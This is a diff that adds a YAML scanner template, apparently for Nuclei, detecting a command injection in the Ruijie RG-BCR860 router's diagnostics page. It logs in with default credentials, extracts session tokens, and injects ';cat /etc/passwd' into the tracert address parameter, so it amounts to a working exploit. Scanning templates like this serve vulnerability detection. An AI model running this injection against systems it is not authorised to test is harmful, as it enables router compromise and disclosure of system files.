@@ -1,0 +1,68 @@
+id: rujie-rg-bcr860-command-injection
+info:
+  name: Ruijie RG-BCR860 Backend Command Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/luci/admin"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "luci_username=root&luci_password=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        internal: true
+        regex:
+          - "sysauth=([a-zA-Z0-9]+);"
+      - type: regex
+        name: stok
+        part: header
+        internal: true
+        regex:
+          - ";stok=([a-zA-Z0-9]+)/admin"
+
+  - id: validate
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/luci/;stok={{stok}}/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&seq=0"
+    headers:
+      Cookie: "sysauth={{cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: confirm
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/luci/;stok={{stok}}/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&seq=0"
+    headers:
+      Cookie: "sysauth={{cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
